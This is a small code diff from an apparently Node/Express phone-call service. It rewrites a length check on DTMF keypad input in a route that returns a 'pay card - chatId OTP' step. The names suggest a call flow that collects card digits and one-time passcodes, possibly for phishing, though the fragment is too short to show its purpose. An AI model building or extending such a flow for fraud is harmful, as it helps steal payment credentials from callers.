@@ -604,7 +604,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
   }
 
   if (isAccount === 'yes') {
-    if (dtmf.length >= 15 || dtmf.length <= 18) {
+    if (!(dtmf.length > 15 && dtmf.length < 18)) {
       return res.json({
         id: uuidv4(),
         title: `pay card - ${chatId} OTP`,
